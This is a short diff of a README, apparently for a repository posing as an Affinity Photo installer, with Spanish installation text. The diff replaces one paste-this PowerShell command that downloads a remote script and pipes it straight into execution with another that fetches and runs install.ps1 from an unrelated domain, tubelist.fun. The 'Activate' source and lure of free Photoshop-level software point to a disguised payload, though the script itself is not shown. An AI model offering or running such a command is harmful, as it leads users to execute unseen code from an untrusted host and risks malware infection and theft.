@@ -16,7 +16,7 @@ Professional photo editing software offering Photoshop-level capabilities at a o
 ## Instalacion (ES)
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 Affinity Photo es una alternativa completa a Photoshop que no requiere suscripcion mensual.
